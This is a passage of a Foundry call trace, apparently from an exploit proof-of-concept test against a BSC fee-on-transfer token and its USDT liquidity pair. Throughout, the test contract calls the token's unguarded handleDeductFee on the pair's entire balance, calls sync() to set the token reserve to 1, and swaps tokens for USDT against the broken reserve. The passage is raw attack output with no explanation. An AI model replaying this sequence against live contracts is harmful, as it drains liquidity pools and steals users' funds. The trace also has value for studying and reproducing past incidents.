    │   │   │   ├─ emit Transfer(from: 0xf30382447Edd815b0fAA159F2716665d103D4c47, to: 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, value: 25925217555168218691 [2.592e19])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xf30382447Edd815b0fAA159F2716665d103D4c47) [staticcall]
    │   │   │   └─ ← [Return] 8727846945380684691815 [8.727e21]
    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xf30382447Edd815b0fAA159F2716665d103D4c47) [staticcall]
    │   │   │   └─ ← [Return] 31986252127783453310 [3.198e19]
    │   │   ├─ emit Sync(: 8727846945380684691815 [8.727e21], : 31986252127783453310 [3.198e19])
    │   │   ├─ emit Swap(param0: 0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125, param1: 0, param2: 100000000000000000 [1e17], param3: 27289702689650756516 [2.728e19], param4: 0, param5: 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0)
    │   │   └─ ← [Stop] 
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [187826] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::swap(581226722624428439254 [5.812e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─ [1433] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125) [staticcall]
    │   │   │   ├─ [602] 0xEfADce528668B7315887220fD539842BC6E6f964::isRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isUsdt(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::isUsdt(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [148425] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::transferFee(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 581226722624428439254 [5.812e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ [1174] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::calDeductFee(0, 581226722624428439254 [5.812e20]) [staticcall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001c5b86ea47ba32f7c0
    │   │   │   ├─ [39941] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::handleDeductFee(0, 58122672262442843926 [5.812e19], 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   ├─ emit FeeDeduct(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, : 46498137809954275140 [4.649e19], : 0, : 0)
    │   │   │   │   ├─ emit Transfer(from: 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, to: 0xE1a5f7Cb03A5Ff1F7B68c89A9E423Fa1A8255D4d, value: 46498137809954275140 [4.649e19])
    │   │   │   │   ├─ emit FeeDeduct(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, : 11624534452488568785 [1.162e19], : 0, : 2)
    │   │   │   │   ├─ emit Transfer(from: 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, to: 0x0b86A52a33Ab78aA953c36509defE757dCD75a2e, value: 11624534452488568785 [1.162e19])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Transfer(from: 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 523104050361985595328 [5.231e20])
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001c5b86ea47ba32f7c0
    │   │   ├─ [1236] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::balanceOf(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0) [staticcall]
    │   │   │   └─ ← [Return] 2475934908959250770987025 [2.475e24]
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0) [staticcall]
    │   │   │   └─ ← [Return] 110131984045575168218691 [1.101e23]
    │   │   ├─ emit Sync(: 2475934908959250770987025 [2.475e24], : 110131984045575168218691 [1.101e23])
    │   │   ├─ emit Swap(param0: 0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125, param1: 0, param2: 25925217555168218691 [2.592e19], param3: 581226722624428439254 [5.812e20], param4: 0, param5: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [4958] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::reflowDistributeFee(0)
    │   │   └─ ← [Stop] 
    │   ├─ [4958] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::reflowDistributeFee(1)
    │   │   └─ ← [Stop] 
    │   ├─ [4958] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::reflowDistributeFee(2)
    │   │   └─ ← [Stop] 
    │   ├─ [4958] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::reflowDistributeFee(3)
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000016345785d8a00000000000000000000000000000000000000000000000000017ab880025aa7cba400000000000000000000000000000000000000000000001f822420c1798df6d6
    ├─ [24583] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::approve(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [1236] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::balanceOf(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0) [staticcall]
    │   └─ ← [Return] 2475934908959250770987025 [2.475e24]
    ├─ [13541] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::handleDeductFee(0, 2475934908959250770987024 [2.475e24], 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ emit FeeDeduct(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, : 1980747927167400616789619 [1.98e24], : 0, : 0)
    │   ├─ emit Transfer(from: 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, to: 0xE1a5f7Cb03A5Ff1F7B68c89A9E423Fa1A8255D4d, value: 1980747927167400616789619 [1.98e24])
    │   ├─ emit FeeDeduct(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, : 495186981791850154197404 [4.951e23], : 0, : 2)
    │   ├─ emit Transfer(from: 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, to: 0x0b86A52a33Ab78aA953c36509defE757dCD75a2e, value: 495186981791850154197404 [4.951e23])
    │   └─ ← [Stop] 
    ├─ [8535] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::sync()
    │   ├─ [1236] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::balanceOf(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0) [staticcall]
    │   │   └─ ← [Return] 110131984045575168218691 [1.101e23]
    │   ├─ emit Sync(: 1, : 110131984045575168218691 [1.101e23])
    │   └─ ← [Stop] 
    ├─ [8280] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 523104050361985595328 [5.231e20]
    ├─ [353337] 0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125::swapExactTokensForTokens(523104050361985595328 [5.231e20], 0, [0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1661699870 [1.661e9])
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [981] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::validateBk(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Stop] 
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [49368] 0x2208DcA4A9d19B1592518FA2ba27479E1945710a::getAmountsOut(523104050361985595328 [5.231e20], [0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [15701] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::calDeductFee(1, 523104050361985595328 [5.231e20]) [staticcall]
    │   │   │   ├─ [12023] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::getInsuredConfigRatio() [staticcall]
    │   │   │   │   ├─ [6461] 0xe62DF9d78b7224893aCD88fCFe9083049c2b1e8E::aa9fccce() [staticcall]
    │   │   │   │   │   ├─ [425] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::getReserves() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000001752444e3130f79e564300000000000000000000000000000000000000000000000000000000630b871e
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000198593060d5ac77893
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isUsdt(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::isUsdt(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [425] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000001752444e3130f79e564300000000000000000000000000000000000000000000000000000000630b871e
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(00000000000000000000000055d398326f99059ff775485246999027b3197955) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::isUsdt(0x55d398326f99059fF775485246999027B3197955) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::isUsdt(0x55d398326f99059fF775485246999027B3197955) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [1656] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::f3a83fc1(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   │   ├─ [825] 0xEfADce528668B7315887220fD539842BC6E6f964::f3a83fc1(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [3881] 0x8672cfB5F822C38D9023c84cBbBF4471aCd5c93C::calcFee(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, 1, 110131984045575168218456 [1.101e23]) [staticcall]
    │   │   │   ├─ [3041] 0xE932fB810dad56d2aE5a9c52114e7992ADDC9b53::calcFee(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, 1, 110131984045575168218456 [1.101e23]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000012a836a4f4272c7eaaa
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000012a836a4f4272c7eaaa
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000001c5b86ea47ba32f7c0000000000000000000000000000000000000000000001752444e3130f79e5558
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [139440] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::transferFromFee(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, 523104050361985595328 [5.231e20], 1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─ [5201] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::calDeductFee(1, 523104050361985595328 [5.231e20]) [staticcall]
    │   │   │   ├─ [3523] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::getInsuredConfigRatio() [staticcall]
    │   │   │   │   ├─ [2461] 0xe62DF9d78b7224893aCD88fCFe9083049c2b1e8E::aa9fccce() [staticcall]
    │   │   │   │   │   ├─ [425] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::getReserves() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000001752444e3130f79e564300000000000000000000000000000000000000000000000000000000630b871e
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000198593060d5ac77893
    │   │   ├─ [82204] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::handleDeductFee(1, 52310405036198559533 [5.231e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ [3523] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::getInsuredConfigRatio() [staticcall]
    │   │   │   │   ├─ [2461] 0xe62DF9d78b7224893aCD88fCFe9083049c2b1e8E::aa9fccce() [staticcall]
    │   │   │   │   │   ├─ [425] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::getReserves() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000001752444e3130f79e564300000000000000000000000000000000000000000000000000000000630b871e
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ emit FeeDeduct(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, : 15693121510859567859 [1.569e19], : 1, : 4)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xE1a5f7Cb03A5Ff1F7B68c89A9E423Fa1A8255D4d, value: 15693121510859567859 [1.569e19])
    │   │   │   ├─ emit FeeDeduct(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, : 15693121510859567859 [1.569e19], : 1, : 6)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xE1a5f7Cb03A5Ff1F7B68c89A9E423Fa1A8255D4d, value: 15693121510859567859 [1.569e19])
    │   │   │   ├─ emit FeeDeduct(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, : 10462081007239711906 [1.046e19], : 1, : 7)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x3b3095D0F80Fe533A826094791dD142338dF16FC, value: 10462081007239711906 [1.046e19])
    │   │   │   ├─ emit FeeDeduct(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1, : 10462081007239711906 [1.046e19], : 1, : 2)
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0b86A52a33Ab78aA953c36509defE757dCD75a2e, value: 10462081007239711906 [1.046e19])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0, value: 470793645325787035795 [4.707e20])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000198593060d5ac77893
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [5260] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::getFeeConfig(5, 9) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000022ce0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000dead
    │   ├─ [410] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::getBase() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000002710
    │   ├─ [425] 0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0::getReserves() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000001752444e3130f79e564300000000000000000000000000000000000000000000000000000000630b871e
    │   ├─ [2383] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::getReduceThreshold() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000027b46536c66c8e3000000
    │   ├─ [1390] 0x547aE92f7c0a7aD4230fb12a348BC56810dF3868::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [staticcall]
    │   │   ├─ [559] 0xEfADce528668B7315887220fD539842BC6E6f964::c0afa137(000000000000000000000000443195aa3a4357242a7427fc8ce5f20c1e71fcb1) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [717] 0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1::isWeList(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
